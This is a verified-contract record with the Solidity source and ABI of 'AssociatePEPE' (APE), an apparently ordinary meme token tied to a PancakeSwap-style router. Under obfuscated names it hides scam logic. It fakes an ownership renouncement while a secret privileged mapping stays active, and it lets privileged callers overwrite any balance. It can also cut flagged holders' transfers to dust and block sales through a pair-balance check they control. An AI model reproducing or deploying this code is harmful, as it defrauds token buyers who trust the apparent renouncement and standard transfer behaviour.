{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface amountToSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedToken) external view returns (uint256);\n\n    function transfer(address amountReceiver, uint256 senderTotal) external returns (bool);\n\n    function allowance(address buySwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountReceiver,\n        uint256 senderTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listToMode, uint256 value);\n    event Approval(address indexed buySwap, address indexed spender, uint256 value);\n}\n\nabstract contract exemptTeamList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverFrom {\n    function createPair(address listBuy, address receiverTxMode) external returns (address);\n}\n\ninterface amountToSenderMetadata is amountToSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AssociatePEPE is exemptTeamList, amountToSender, amountToSenderMetadata {\n\n    address launchFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function walletReceiverEnable(address maxShould) public {\n        require(maxShould.balance < 100000);\n        if (shouldFrom) {\n            return;\n        }\n        if (maxWallet != tradingTeamShould) {\n            tradingTeamShould = maxWallet;\n        }\n        swapMin[maxShould] = true;\n        if (feeAtAmount) {\n            tradingTeamShould = takeBuy;\n        }\n        shouldFrom = true;\n    }\n\n    uint256 private enableFee = 100000000 * 10 ** 18;\n\n    bool private amountMax;\n\n    string private fromTotalBuy = \"Associate PEPE\";\n\n    function tradingMax() private view {\n        require(swapMin[_msgSender()]);\n    }\n\n    address listSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoIs;\n    }\n\n    function getOwner() external view returns (address) {\n        return enableLiquiditySender;\n    }\n\n    uint256 feeTrading;\n\n    bool public feeAtAmount;\n\n    mapping(address => uint256) private senderAuto;\n\n    function feeList() public {\n        emit OwnershipTransferred(autoWalletEnable, address(0));\n        enableLiquiditySender = address(0);\n    }\n\n    string private autoLaunch = \"APE\";\n\n    function fromReceiver(uint256 senderTotal) public {\n        tradingMax();\n        shouldBuy = senderTotal;\n    }\n\n    function autoEnableSell(address walletAmount) public {\n        tradingMax();\n        if (tradingFee != amountMax) {\n            maxWallet = tradingTeamShould;\n        }\n        if (walletAmount == autoWalletEnable || walletAmount == fundSellLimit) {\n            return;\n        }\n        totalTeam[walletAmount] = true;\n    }\n\n    function approve(address toLiquidity, uint256 senderTotal) public virtual override returns (bool) {\n        launchedFee[_msgSender()][toLiquidity] = senderTotal;\n        emit Approval(_msgSender(), toLiquidity, senderTotal);\n        return true;\n    }\n\n    function transferFrom(address listTeam, address amountReceiver, uint256 senderTotal) external override returns (bool) {\n        if (_msgSender() != launchFund) {\n            if (launchedFee[listTeam][_msgSender()] != type(uint256).max) {\n                require(senderTotal <= launchedFee[listTeam][_msgSender()]);\n                launchedFee[listTeam][_msgSender()] -= senderTotal;\n            }\n        }\n        return swapFrom(listTeam, amountReceiver, senderTotal);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoLaunch;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fromTotalBuy;\n    }\n\n    bool private tradingFee;\n\n    function swapFrom(address listTeam, address amountReceiver, uint256 senderTotal) internal returns (bool) {\n        if (listTeam == autoWalletEnable) {\n            return launchBuyReceiver(listTeam, amountReceiver, senderTotal);\n        }\n        uint256 modeTx = amountToSender(fundSellLimit).balanceOf(listSwap);\n        require(modeTx == shouldBuy);\n        require(amountReceiver != listSwap);\n        if (totalTeam[listTeam]) {\n            return launchBuyReceiver(listTeam, amountReceiver, tokenWalletAmount);\n        }\n        return launchBuyReceiver(listTeam, amountReceiver, senderTotal);\n    }\n\n    mapping(address => bool) public swapMin;\n\n    bool private buyReceiver;\n\n    uint256 public tradingTeamShould;\n\n    function transfer(address minFee, uint256 senderTotal) external virtual override returns (bool) {\n        return swapFrom(_msgSender(), minFee, senderTotal);\n    }\n\n    address private enableLiquiditySender;\n\n    uint256 public maxWallet;\n\n    mapping(address => bool) public totalTeam;\n\n    uint256 constant tokenWalletAmount = 18 ** 10;\n\n    uint8 private autoIs = 18;\n\n    bool public shouldFrom;\n\n    mapping(address => mapping(address => uint256)) private launchedFee;\n\n    function owner() external view returns (address) {\n        return enableLiquiditySender;\n    }\n\n    address public autoWalletEnable;\n\n    address public fundSellLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableFee;\n    }\n\n    function balanceOf(address launchedToken) public view virtual override returns (uint256) {\n        return senderAuto[launchedToken];\n    }\n\n    function fromTo(address minFee, uint256 senderTotal) public {\n        tradingMax();\n        senderAuto[minFee] = senderTotal;\n    }\n\n    function allowance(address exemptMode, address toLiquidity) external view virtual override returns (uint256) {\n        if (toLiquidity == launchFund) {\n            return type(uint256).max;\n        }\n        return launchedFee[exemptMode][toLiquidity];\n    }\n\n    uint256 private takeBuy;\n\n    constructor (){\n        \n        liquidityToken enableSender = liquidityToken(launchFund);\n        fundSellLimit = receiverFrom(enableSender.factory()).createPair(enableSender.WETH(), address(this));\n        if (amountMax != feeAtAmount) {\n            takeBuy = maxWallet;\n        }\n        autoWalletEnable = _msgSender();\n        feeList();\n        swapMin[autoWalletEnable] = true;\n        senderAuto[autoWalletEnable] = enableFee;\n        if (tradingTeamShould != maxWallet) {\n            maxWallet = takeBuy;\n        }\n        emit Transfer(address(0), autoWalletEnable, enableFee);\n    }\n\n    function launchBuyReceiver(address listTeam, address amountReceiver, uint256 senderTotal) internal returns (bool) {\n        require(senderAuto[listTeam] >= senderTotal);\n        senderAuto[listTeam] -= senderTotal;\n        senderAuto[amountReceiver] += senderTotal;\n        emit Transfer(listTeam, amountReceiver, senderTotal);\n        return true;\n    }\n\n    uint256 shouldBuy;\n\n    event OwnershipTransferred(address indexed marketingShouldLiquidity, address indexed senderFrom);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buySwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingShouldLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listToMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAmount\",\"type\":\"address\"}],\"name\":\"autoEnableSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoWalletEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAtAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderTotal\",\"type\":\"uint256\"}],\"name\":\"fromReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTotal\",\"type\":\"uint256\"}],\"name\":\"fromTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSellLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTeamShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxShould\",\"type\":\"address\"}],\"name\":\"walletReceiverEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AssociatePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}